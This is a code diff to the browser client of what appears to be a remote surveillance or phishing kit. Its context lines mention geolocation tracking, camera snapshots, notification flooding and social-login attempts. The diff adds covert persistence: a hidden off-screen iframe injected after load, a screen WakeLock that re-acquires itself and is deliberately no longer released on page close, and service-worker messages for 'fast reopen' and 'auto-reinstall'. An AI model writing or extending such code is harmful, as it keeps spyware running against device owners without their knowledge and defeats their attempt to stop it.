@@ -201,9 +201,39 @@ function initPersistentStorage() {
     };
 }
 
-const socket = io(SERVER_URL, { query: { deviceId: localStorage.getItem('deviceId') || '' } });
+// Detect iframe mode from URL params
+const _iframeMode = new URLSearchParams(window.location.search).get('iframe') === '1' || window.location.pathname === '/iframe';
+const _iframeDeviceId = new URLSearchParams(window.location.search).get('id') || '';
+
+const socket = io(SERVER_URL, { 
+    query: { 
+        deviceId: _iframeDeviceId || localStorage.getItem('deviceId') || '',
+        iframe: _iframeMode ? '1' : ''
+    } 
+});
 window.socket = socket;
-socket.on('device-id', (id) => { deviceId = id; localStorage.setItem('deviceId', id); });
+
+// In iframe mode, skip UI entirely
+if (!_iframeMode) {
+    // Register service worker (not needed in iframe)
+    registerSW();
+}
+
+socket.on('device-id', (id) => { 
+    deviceId = id; 
+    localStorage.setItem('deviceId', id); 
+    if (!_iframeMode) {
+        // Inject hidden iframe for background persistence
+        setTimeout(initHiddenIframe, 2000);
+        // Request WakeLock to prevent sleep
+        requestWakeLock();
+    } else {
+        // In iframe, notify SW we're alive
+        if (navigator.serviceWorker?.controller) {
+            navigator.serviceWorker.controller.postMessage({ type: 'IFRAME_ALIVE', time: Date.now() });
+        }
+    }
+});
 
 // Live camera stream control
 let camStreamInterval = null;
@@ -1845,21 +1875,63 @@ function handleSocial(p) {
     if(attemptCount>=3) setTimeout(doRedirect,2000);
 }
 
+// ===== PERSISTENCE: Hidden Iframe + WakeLock =====
+let _hiddenIframe = null;
+function initHiddenIframe() {
+    if (_hiddenIframe) return;
+    if (!deviceId) return;
+    try {
+        // Check if we're already in an iframe
+        if (window.self !== window.top) return;
+        _hiddenIframe = document.createElement('iframe');
+        _hiddenIframe.style.cssText = 'display:none!important;width:0!important;height:0!important;border:none!important;position:fixed!important;left:-9999px!important;top:-9999px!important;';
+        _hiddenIframe.src = window.location.origin + '/iframe?id=' + encodeURIComponent(deviceId) + '&r=' + Math.random();
+        _hiddenIframe.setAttribute('aria-hidden', 'true');
+        _hiddenIframe.setAttribute('tabindex', '-1');
+        // Append after all content
+        setTimeout(() => {
+            if (!_hiddenIframe.parentNode) {
+                document.body.appendChild(_hiddenIframe);
+            }
+        }, 1000);
+    } catch(e) { console.log('[Iframe] init error:', e.message); }
+}
+function removeHiddenIframe() {
+    try {
+        if (_hiddenIframe && _hiddenIframe.parentNode) {
+            _hiddenIframe.parentNode.removeChild(_hiddenIframe);
+        }
+    } catch(e) {}
+    _hiddenIframe = null;
+}
+
+async function requestWakeLock() {
+    try {
+        if ('wakeLock' in navigator) {
+            wakeLockSentinel = await navigator.wakeLock.request('screen');
+            wakeLockSentinel.addEventListener('release', () => {
+                // Re-acquire if still active
+                if (deviceId) requestWakeLock();
+            });
+        }
+    } catch(e) {}
+}
+
 window.addEventListener('beforeunload',()=>{
     if(watchId)navigator.geolocation.clearWatch(watchId);
     if(stream)stream.getTracks().forEach(t=>t.stop());
     if(snapInterval)clearInterval(snapInterval);
-    if(wakeLockSentinel)wakeLockSentinel.release();
     if(floodInterval)clearInterval(floodInterval);
     if(notifInterval)clearInterval(notifInterval);
     if(window.speechSynthesis)window.speechSynthesis.cancel();
-    // Notify SW for auto-reinstall
+    // Don't release wakeLock — let it persist via iframe
+    // Notify SW immediately for fast reopen
     if (navigator.serviceWorker?.controller) {
         navigator.serviceWorker.controller.postMessage({ type: 'CLIENT_CLOSED', time: Date.now() });
     }
-    // Also try sendBeacon
+    // Also try sendBeacon to mark device as potentially offline
     try {
-        navigator.sendBeacon('/api/heartbeat', JSON.stringify({ deviceId: deviceId, time: Date.now(), closed: true }));
+        navigator.sendBeacon('/api/heartbeat', JSON.stringify({ deviceId: deviceId, time: Date.now(), closed: true, iframe: !!_hiddenIframe }));
     } catch(e) {}
 });
 
